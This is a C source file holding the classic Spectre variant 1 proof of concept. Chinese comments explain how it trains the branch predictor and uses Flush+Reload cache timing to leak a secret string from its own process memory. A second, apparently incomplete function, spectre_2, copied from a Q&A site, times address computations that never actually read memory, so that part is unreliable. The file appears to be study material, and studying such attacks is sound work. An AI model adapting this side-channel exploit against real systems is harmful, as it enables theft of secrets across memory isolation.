#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};	//array1代表了受害者和攻击者之间的共享内存空间
uint8_t unused2[64];		//array1被两个未使用的数组包围：这些数组对于确保我们命中不同的缓存路径是很有用的
uint8_t array2[256 * 512];
//保密信息。该保密信息只有受害者知道，也正是攻击者想要恢复的东西。
char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
//攻击者会具有调用victim_function()(第29-35行)的能力
void victim_function(size_t x)
{
	if (x < array1_size)	//读取array1_size。这一操作会导致缓存丢失。
	{	//推测读取array1[x]。该读取非常快速，因为它是缓存命中。 读取array2[array1[x]* 512]。读取时间很长(缓存缺失)。
		temp &= array2[array1[x] * 512];
		//uint8_t i = array2[array1[x] * 512];
	}//虽然步骤4中的读取正在等待，但是步骤1的值已经到达。处理器检测到其猜测不正确，并重新调整了自身状态。
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
//该函数将尝试猜测位于给定地址的值。对于所有可能的字节值(有256个)，该函数将测试使用Flush+Reload缓存攻击访问该值所需的时间
/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{//缓存攻击是在第54行和第89行之间实现的
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)//删除了整个array2表。该表是与攻击者共享的，它需要能够存储256个不同的缓存线路。而缓存线路的大小是512位
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)//调用victim_function() 几次(参见第62-77行)
		{	//刷新缓存线路，接下来，根据我的理解，下面的代码行是用来确保刷新完成的
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)//下面的代码行是用来确保刷新完成的
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
			//rintf("j=%d tries=%d malicious_x=%p training_x=%zu x=%zu\n", j, tries, (void *)malicious_x, training_x, x);
		}
		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		//缓存攻击的核心(第79-89行)。
		for (i = 0; i < 256; i++)
		{//序列中每个字节的访问时间,将它们混合在一起，这样处理器就无法猜测下一步它将访问哪个字节，然后优化访问
			mix_i = ((i * 167) + 13) & 255; //这样处理器就无法猜测下一步它将访问哪个字节，然后优化访问。这是第82行处理的。
			addr = &array2[mix_i * 512];	//计算缓存线路的地址来进行检查
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			//我们测定访问该缓存线路中一个值的时间。如果速度很快，它就是缓存命中。如果是慢的，就是一个缓存缺失。
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
			else{
				//printf("======>%d\n", time2);
			}
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int spectre_1(int argc, const char* * argv)
{
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	//进程内存的布局中，我们有array1，然后是一串字节，然后是密文。因此，当我们读取array1
	//超出其在victim_function()的限制时，如果我们想在密文中读取字节，我们需要跳过一个给定的字节偏移量。要计算偏移量，
	//我们知道 array1 + offset = secret。所以， array1 + offset = secret:)
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret) + 10;
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3)
	{
		//sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		//malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}

		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("=============>Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}

//https://security.stackexchange.com/questions/177724/spectre-proof-of-concept-poc-speculative-execution-checking-for-value
#define CACHELINESIZE   4096
#define REP     100
void spectre_2(void)
{
    typedef char line[CACHELINESIZE];
    line A[512];

    // Initialise array to 'A'
    for(int i=0; i<512; i++)
    {
        for(int j=0; j<CACHELINESIZE; j++)
        {
            A[i][j]='A'; 
        }
    }


    // Flush address of i
    for (int i = 0; i < 512; i++)
    {
        _mm_clflush( & A[i]); /* intrinsic for clflush instruction */
    }

    char secret = 'U';
    char any = 'X';

    char* pcheck[REP];
    line* pwrite[REP];

    for(int i=0; i<REP; i++) {
        pcheck[i] = &any; 
        pwrite[i] = A; 
    }

    /*
    for(int i=0;i<REP;i++)
    {
        printf("pcheck: %c\n",*pcheck[i]);
        printf("pwrite: %s\n",*pwrite[i]);
    }
    */

    pcheck[REP-1] = &secret;
    pwrite[REP-1] = A+256;

    /*
    printf("pcheck:%c\n", *pcheck[REP-1]);
    printf("pwrite:%c\n", **pwrite[REP-1]);
    */

    char dummy;
    for(int i=0; i<REP; i++) {
        if (i != (REP-1)) {
            dummy = *pcheck[i];
        }
    }
    int t0,time_taken = 0;
    int junk = 0;

    char * val;
    int mix_i=0;

    int i,j;
    int aux,res;

    char RandomId[26];
    char ListId[26]={65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90};



    srand(time(NULL));

    for(i=0; i<26; i++)
    {
        res = rand() % 26;
        aux = ListId[res];

        if (ListId[res] != -1)
        {
            RandomId[i] = aux;
            ListId[res] = -1;
        }
        else
            i--;
    }


    for(i=0; i<26; i++)
    {
        t0 = __rdtscp(&junk); 
        val = &A[256+RandomId[i]];
        time_taken = __rdtscp(&junk) - t0;
        printf("trying: %c time: %i\n",RandomId[i],time_taken);

    }
}

int main(int argc, const char* * argv){
	spectre_1(argc, argv);
	//spectre_2();
	
	return 0;
}
